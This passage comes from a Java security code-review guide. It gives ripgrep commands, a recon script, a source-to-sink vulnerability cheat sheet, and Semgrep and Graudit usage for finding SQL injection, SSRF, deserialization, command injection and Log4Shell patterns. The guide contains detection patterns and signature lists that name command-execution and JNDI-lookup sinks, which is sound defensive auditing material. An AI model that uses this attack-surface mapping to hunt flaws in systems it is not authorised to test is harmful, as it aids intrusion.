rg 'MultipartFile|getPart\(|getSubmittedFileName\(\)|getOriginalFilename\(' --type java

# === WebSocket messages ===
rg '@OnMessage|TextMessage|BinaryMessage|handleTextMessage|handleBinaryMessage' --type java

# === Database (second-order) — data read from DB that was user-supplied ===
rg 'resultSet\.getString\(|\.findBy|\.getOne\(|\.findById\(' --type java

# === Environment / config that user may influence ===
rg 'System\.getenv\(|System\.getProperty\(|@Value\("\$\{' --type java

# === Multipart / form data ===
rg 'request\.getParts\(\)|MultipartHttpServletRequest|CommonsMultipartResolver' --type java
```

**Spring-specific shortcut — find all controller methods (every source at once):**
```bash
rg '@(Get|Post|Put|Delete|Patch|Request)Mapping' --type java -l | \
  xargs rg 'public .+\(' --type java | grep -i 'controller\|resource\|endpoint\|api'
```

### Step 2: Map All Sinks (Dangerous Operations)

#### SQL Execution Sinks
```bash
rg 'executeQuery\(|executeUpdate\(|execute\(|createQuery\(|createNativeQuery\(|createSQLQuery\(' --type java
rg 'jdbcTemplate\.(query|update|execute|batchUpdate)\(' --type java
rg 'namedParameterJdbcTemplate\.' --type java
rg '@Query\(' --type java  # Spring Data — check for native + concat
```

#### Command Execution Sinks
```bash
rg 'Runtime\.getRuntime\(\)\.exec\(' --type java
rg 'new ProcessBuilder\(' --type java
rg 'ScriptEngine.*eval\(|GroovyShell.*evaluate\(' --type java
rg 'javax\.script\.ScriptEngine|Bindings' --type java
```

#### File System Sinks
```bash
rg 'new File\(|new FileInputStream\(|new FileOutputStream\(|new FileReader\(|new FileWriter\(' --type java
rg 'Files\.(read|write|copy|move|delete|newInputStream|newOutputStream|walk|list)\(' --type java
rg 'Paths\.get\(|Path\.of\(|Path\.resolve\(' --type java
rg 'ClassLoader.*getResource\(|getResourceAsStream\(' --type java
rg 'FileUtils\.(read|write|copy|move)\(' --type java  # Apache Commons
```

#### Network / SSRF Sinks
```bash
rg 'new URL\(|openConnection\(\)|openStream\(\)' --type java
rg 'HttpURLConnection|HttpsURLConnection' --type java
rg 'RestTemplate.*(get|post|put|delete|exchange|execute)\(' --type java
rg 'WebClient.*\.uri\(|\.baseUrl\(' --type java
rg 'OkHttpClient|CloseableHttpClient|HttpClients\.create' --type java
rg 'Jsoup\.connect\(' --type java
rg 'Socket\(|new Socket\(|InetAddress\.getByName\(' --type java
```

#### Deserialization Sinks
```bash
rg 'ObjectInputStream|readObject\(\)|readUnshared\(\)' --type java
rg 'XMLDecoder|XStream.*fromXML|ObjectMapper.*readValue|Yaml.*load\(' --type java
rg 'JsonParser.*parse|Gson.*fromJson' --type java
rg '@JsonTypeInfo|enableDefaultTyping|activateDefaultTyping' --type java  # Jackson polymorphic
```

#### XML Parsing Sinks (XXE)
```bash
rg 'DocumentBuilderFactory|SAXParserFactory|XMLInputFactory|TransformerFactory' --type java
rg 'SAXReader|SAXBuilder|XMLReaderFactory|SchemaFactory' --type java
rg 'Unmarshaller.*unmarshal\(' --type java  # JAXB
rg 'Validator.*validate\(' --type java
```

#### Template / Expression Sinks (SSTI / EL Injection)
```bash
rg 'SpelExpressionParser|parseExpression\(|ExpressionParser' --type java  # SpEL
rg 'OgnlUtil\|ValueStack\|ActionContext' --type java  # OGNL (Struts)
rg 'MVEL.*eval\(|MVEL.*compile\(' --type java
rg 'Freemarker.*Template|Configuration.*getTemplate\(' --type java
rg 'VelocityEngine.*evaluate\(|Velocity.*merge\(' --type java
rg 'PebbleEngine.*getTemplate\(' --type java
```

#### LDAP Sinks
```bash
rg 'DirContext.*search\(|LdapTemplate.*search\(|InitialDirContext' --type java
rg 'NamingEnumeration|SearchControls|LdapQuery' --type java
```

#### Redirect Sinks
```bash
rg 'response\.sendRedirect\(|redirect:\|RedirectView\(' --type java
rg 'response\.setHeader\("Location"|response\.addHeader\("Location"' --type java
rg 'HttpHeaders\.LOCATION|URI\.create\(' --type java
```

#### Log Sinks (Log Injection / Log4Shell)
```bash
rg 'log\.(info|warn|error|debug|trace|fatal)\(.*\+' --type java  # string concat in logs
rg 'logger\.(info|warn|error|debug)\(.*request\.' --type java  # user input in logs
rg '\$\{jndi:' --include='*.java' --include='*.xml' --include='*.properties'  # Log4Shell
```

#### Crypto Sinks
```bash
rg 'Cipher\.getInstance\(|MessageDigest\.getInstance\(|SecretKeySpec\(' --type java
rg 'KeyGenerator\.getInstance\(|KeyPairGenerator\.getInstance\(' --type java
rg 'Mac\.getInstance\(|Signature\.getInstance\(' --type java
```

#### Response Output Sinks (XSS)
```bash
rg 'response\.getWriter\(\)\.write\(|response\.getWriter\(\)\.print\(' --type java
rg 'PrintWriter.*print\(.*request\.' --type java
rg 'out\.println\(.*request\.' --include='*.jsp'
rg 'th:utext|v-html|\$\!{' --include='*.html' --include='*.vm'  # Thymeleaf/Velocity unescaped
```

### Step 3: Trace Source → Sink (The Actual Bug Finding)

#### Automated: Quick taint-trace with grep chains
```bash
# Find methods that take request params AND hit SQL
for f in $(rg -l '@RequestParam|@PathVariable|@RequestBody' --type java); do
  rg -l 'createQuery\|executeQuery\|createNativeQuery\|jdbcTemplate' "$f" && echo ">>> SQLI candidate: $f"
done

# Find methods that take request params AND hit exec
for f in $(rg -l '@RequestParam|@PathVariable' --type java); do
  rg -l 'Runtime.*exec\|ProcessBuilder' "$f" && echo ">>> CMDi candidate: $f"
done

# Find methods that take request params AND hit URL/HTTP
for f in $(rg -l '@RequestParam|@PathVariable|@RequestBody' --type java); do
  rg -l 'new URL\|RestTemplate\|WebClient\|openConnection' "$f" && echo ">>> SSRF candidate: $f"
done

# Find methods that take request params AND hit File operations
for f in $(rg -l '@RequestParam|@PathVariable|getParameter' --type java); do
  rg -l 'new File\|Paths\.get\|FileInputStream\|Files\.' "$f" && echo ">>> PathTraversal candidate: $f"
done

# Find controllers with no auth annotations
rg '@(Rest)?Controller' --type java -l | \
  xargs rg -L '@PreAuthorize|@Secured|@RolesAllowed|@IsAuthenticated' | \
  grep -i 'controller'
```

#### Manual: Follow the data flow

For each candidate file from above:
```
1. Find the controller method (source entry)
2. Trace the parameter through:
   - Direct use → immediate vuln
   - Assigned to variable → follow the variable
   - Passed to service method → open service, keep tracing
   - Passed to repository/DAO → check query construction
3. At each step ask: is there validation/sanitization?
   - Allowlist check? (safe)
   - Regex/blocklist? (often bypassable)
   - Framework parameterization? (safe for SQLi, not for SSRF)
   - Nothing? → VULNERABILITY
```

### Step 4: Map the Full Attack Surface (One-Shot Recon)

Run this to generate a full attack surface inventory:
```bash
#!/bin/bash
# save as audit-java-surface.sh
TARGET_DIR="${1:-.}"

echo "=== CONTROLLERS & ENDPOINTS ==="
rg -n '@(Get|Post|Put|Delete|Patch|Request)Mapping\(' -t java "$TARGET_DIR" | sort

echo -e "\n=== SOURCES (User Input) ==="
rg -n '@(RequestParam|PathVariable|RequestBody|RequestHeader|CookieValue)\b' -t java "$TARGET_DIR" | wc -l
echo "  RequestParam:  $(rg -c '@RequestParam' -t java "$TARGET_DIR" 2>/dev/null | awk -F: '{s+=$2}END{print s}')"
echo "  PathVariable:  $(rg -c '@PathVariable' -t java "$TARGET_DIR" 2>/dev/null | awk -F: '{s+=$2}END{print s}')"
echo "  RequestBody:   $(rg -c '@RequestBody' -t java "$TARGET_DIR" 2>/dev/null | awk -F: '{s+=$2}END{print s}')"

echo -e "\n=== DANGEROUS SINKS ==="
echo "  SQL exec:       $(rg -c 'executeQuery\|createQuery\|createNativeQuery' -t java "$TARGET_DIR" 2>/dev/null | awk -F: '{s+=$2}END{print s}')"
echo "  Cmd exec:       $(rg -c 'Runtime.*exec\|ProcessBuilder' -t java "$TARGET_DIR" 2>/dev/null | awk -F: '{s+=$2}END{print s}')"
echo "  File ops:       $(rg -c 'new File\|Paths\.get\|FileInputStream' -t java "$TARGET_DIR" 2>/dev/null | awk -F: '{s+=$2}END{print s}')"
echo "  URL/HTTP:       $(rg -c 'new URL\|RestTemplate\|WebClient\|openConnection' -t java "$TARGET_DIR" 2>/dev/null | awk -F: '{s+=$2}END{print s}')"
echo "  Deser:          $(rg -c 'readObject\|XMLDecoder\|fromXML\|readValue' -t java "$TARGET_DIR" 2>/dev/null | awk -F: '{s+=$2}END{print s}')"
echo "  XML parse:      $(rg -c 'DocumentBuilderFactory\|SAXParser\|XMLInputFactory' -t java "$TARGET_DIR" 2>/dev/null | awk -F: '{s+=$2}END{print s}')"
echo "  Expression:     $(rg -c 'parseExpression\|SpelExpression\|OgnlUtil\|MVEL' -t java "$TARGET_DIR" 2>/dev/null | awk -F: '{s+=$2}END{print s}')"
echo "  Redirect:       $(rg -c 'sendRedirect\|redirect:' -t java "$TARGET_DIR" 2>/dev/null | awk -F: '{s+=$2}END{print s}')"
echo "  Crypto:         $(rg -c 'Cipher\.\|MessageDigest\.\|SecretKeySpec' -t java "$TARGET_DIR" 2>/dev/null | awk -F: '{s+=$2}END{print s}')"

echo -e "\n=== NO-AUTH CONTROLLERS ==="
rg '@(Rest)?Controller' -t java -l "$TARGET_DIR" | while read f; do
  rg -L '@PreAuthorize|@Secured|@RolesAllowed' "$f" >/dev/null 2>&1 && echo "  UNPROTECTED: $f"
done

echo -e "\n=== HIGH-VALUE TARGETS (source+sink in same file) ==="
for f in $(rg -l '@RequestParam|@PathVariable|@RequestBody|getParameter' -t java "$TARGET_DIR"); do
  hits=""
  rg -q 'executeQuery\|createQuery\|createNativeQuery\|jdbcTemplate' "$f" && hits="${hits}SQLi "
  rg -q 'Runtime.*exec\|ProcessBuilder' "$f" && hits="${hits}CMDi "
  rg -q 'new URL\|RestTemplate\|WebClient\|openConnection' "$f" && hits="${hits}SSRF "
  rg -q 'readObject\|XMLDecoder\|fromXML' "$f" && hits="${hits}DESER "
  rg -q 'new File\|Paths\.get\|FileInputStream' "$f" && hits="${hits}PATH "
  rg -q 'sendRedirect\|redirect:' "$f" && hits="${hits}REDIR "
  rg -q 'parseExpression\|OgnlUtil' "$f" && hits="${hits}EXPR "
  [ -n "$hits" ] && echo "  $f → $hits"
done
```

### Common Source → Sink Patterns (Cheat Sheet)

| Source | Sink | Vulnerability | Severity |
|--------|------|---------------|----------|
| `@RequestParam` → | `createQuery("..."+param)` | SQL Injection | Critical |
| `@PathVariable` → | `new File(basePath + pathVar)` | Path Traversal | High |
| `@RequestParam` → | `new URL(param).openConnection()` | SSRF | High-Critical |
| `@RequestBody` → | `objectMapper.readValue(body, Object.class)` | Deserialization | Critical |
| `@RequestParam` → | `Runtime.exec("cmd " + param)` | Command Injection | Critical |
| `@RequestParam` → | `response.sendRedirect(param)` | Open Redirect | Medium |
| `@RequestParam` → | `parser.parseExpression(param)` | SpEL Injection (RCE) | Critical |
| `@RequestBody` (XML) → | `DocumentBuilder.parse(input)` | XXE | High |
| `@RequestParam` → | `ldapTemplate.search(filter+param)` | LDAP Injection | High |
| `@RequestParam` → | `log.info("user: " + param)` | Log Injection | Medium |
| `@ModelAttribute` → | auto-bound to entity with `isAdmin` field | Mass Assignment | High |
| `@PathVariable` → | `template.process(pathVar, model)` | SSTI | Critical |
| `getHeader("X-Forwarded-For")` → | `log / IP allowlist check` | Header spoofing | Medium |
| `resultSet.getString()` → | `createQuery(...)` | Second-order SQLi | Critical |
| `getOriginalFilename()` → | `new File(uploadDir, filename)` | Path Traversal via upload | High |

### Tools to Automate Source-Sink Analysis

| Tool | What it does | Command |
|------|-------------|---------|
| **Semgrep** | Pattern-based static analysis, custom rules, taint tracking | `semgrep --config=p/java .` |
| **Graudit** | Grep-based source code auditing with signature databases | `graudit -d java target/` |
| **CodeQL** | Deep taint tracking via code property graphs | Build DB then run Java queries |
| **SpotBugs + FindSecBugs** | Bytecode-level security scan | `mvn com.github.spotbugs:spotbugs-maven-plugin:check` |
| **Snyk Code** | ML-based SAST | `snyk code test` |
| **Joern** | Code property graph queries | Custom CPG queries for Java |

#### Semgrep (Primary Tool)

```bash
# Install
pip install semgrep
# or
brew install semgrep

# === Quick scans by category ===
# Full OWASP + secrets scan
semgrep --config=p/java --config=p/owasp-top-ten --config=p/secrets .

# Java-specific security rules
semgrep --config=p/java --config=p/java-spring --config=p/java-servlets .

# SQL injection only
semgrep --config=r/java.lang.security.audit.sqli --config=r/java.spring.security.audit.sqli .

# Command injection only
semgrep --config=r/java.lang.security.audit.command-injection .

# Deserialization
semgrep --config=r/java.lang.security.audit.unsafe-deserialization .

# SSRF
semgrep --config=r/java.lang.security.audit.ssrf .

# XSS
semgrep --config=r/java.lang.security.audit.xss .

# === Output formats ===
# JSON for parsing
semgrep --config=p/java --json . > semgrep-results.json

# SARIF for GitHub/IDE integration
semgrep --config=p/java --sarif . > semgrep-results.sarif

# Only high/critical findings
semgrep --config=p/java --severity ERROR .

# === Custom rule example: find SSRF in Spring controllers ===
cat > /tmp/ssrf-spring.yml << 'EOF'
rules:
  - id: spring-ssrf
    patterns:
      - pattern-either:
        - pattern: |
            new URL($INPUT).openConnection()
        - pattern: |
            restTemplate.$METHOD($INPUT, ...)
        - pattern: |
            webClient.get().uri($INPUT)
      - pattern-inside: |
          @$MAPPING(...)
          public $RET $FUNC(..., @RequestParam $TYPE $INPUT, ...) { ... }
    message: "Potential SSRF: user input flows into HTTP request"
    languages: [java]
    severity: ERROR
EOF
semgrep --config=/tmp/ssrf-spring.yml .

# === Scan with ALL community rules (slower but thorough) ===
semgrep --config=r/java . --json | python3 -c "
import json,sys
data=json.load(sys.stdin)
for r in sorted(data.get('results',[]), key=lambda x: x.get('extra',{}).get('severity',''), reverse=True):
    sev=r.get('extra',{}).get('severity','?')
    rule=r.get('check_id','')
    path=r.get('path','')
    line=r.get('start',{}).get('line','')
    print(f'[{sev}] {rule} → {path}:{line}')
"
```

#### Graudit (Grep-Based Auditing)

```bash
# Install
git clone https://github.com/wireghoul/graudit.git ~/tools/graudit
# Add to PATH
export PATH="$PATH:$HOME/tools/graudit"
# or symlink
ln -s ~/tools/graudit/graudit /usr/local/bin/graudit

# === Available signature databases ===
ls ~/tools/graudit/signatures/
# Key ones: java.db, sql.db, xss.db, exec.db, crypto.db, secrets.db,
#           php.db, python.db, js.db, dotnet.db, ios.db, android.db

# === Scan Java codebase ===
# Full Java audit
graudit -d java /path/to/source/

# SQL injection patterns
graudit -d sql /path/to/source/

# XSS patterns
graudit -d xss /path/to/source/

# Command execution patterns
graudit -d exec /path/to/source/

# Hardcoded secrets / credentials
graudit -d secrets /path/to/source/

# Crypto issues
graudit -d crypto /path/to/source/

# Android-specific
graudit -d android /path/to/source/

# === Combine multiple databases ===
graudit -d java -d sql -d xss -d exec -d secrets /path/to/source/

# === Useful flags ===
# -x: exclude directories (node_modules, vendor, test)
graudit -d java -x test -x node_modules /path/to/source/

# -l: list matching files only (quick overview)
graudit -d java -l /path/to/source/

# -c: colorize output (better readability)
graudit -d java -c /path/to/source/

# -B/-A: context lines before/after match
graudit -d java -B2 -A2 /path/to/source/

# === Save results for review ===
graudit -d java /path/to/source/ > java-audit-results.txt 2>&1
graudit -d sql /path/to/source/ >> java-audit-results.txt 2>&1
graudit -d exec /path/to/source/ >> java-audit-results.txt 2>&1

# === Custom signatures ===
# Create your own .db file with grep patterns (one per line)
cat > ~/tools/graudit/signatures/ubiquiti.db << 'EOF'
# SSRF sinks
new\s+URL\s*\(
openConnection\s*\(
RestTemplate
WebClient.*uri\(
HttpURLConnection
# Deserialization
readObject\s*\(
XMLDecoder
ObjectInputStream
# Command injection
Runtime.*exec\s*\(
ProcessBuilder
# Weak random
new\s+Random\s*\(
Math\.random
EOF
graudit -d ubiquiti /path/to/source/
```

#### Combined Workflow (Semgrep + Graudit Together)

```bash
#!/bin/bash
# Full Java audit pipeline — run both tools, merge results
TARGET="${1:-.}"
OUTDIR="./audit-results"
mkdir -p "$OUTDIR"

echo "[*] Running Semgrep..."
semgrep --config=p/java --config=p/owasp-top-ten --config=p/secrets \
  --json "$TARGET" > "$OUTDIR/semgrep.json" 2>/dev/null

echo "[*] Running Graudit..."
for db in java sql xss exec secrets crypto; do
  graudit -d $db "$TARGET" > "$OUTDIR/graudit-${db}.txt" 2>/dev/null
done

echo "[*] Counting findings..."
echo "Semgrep: $(python3 -c "import json;print(len(json.load(open('$OUTDIR/semgrep.json')).get('results',[])))" 2>/dev/null) findings"
for f in "$OUTDIR"/graudit-*.txt; do
  db=$(basename "$f" .txt | sed 's/graudit-//')
  count=$(grep -c "." "$f" 2>/dev/null)
  echo "Graudit ($db): $count matches"
done

echo "[*] Results saved to $OUTDIR/"
```

```bash
# FindSecBugs via Maven
mvn compile && mvn com.github.spotbugs:spotbugs-maven-plugin:4.8.3.1:spotbugs \
  -Dspotbugs.plugins.plugin.groupId=com.h3xstream.findsecbugs \
  -Dspotbugs.plugins.plugin.artifactId=findsecbugs-plugin
```

---

*Last updated: 2026-05-13 | For educational/authorized testing only*
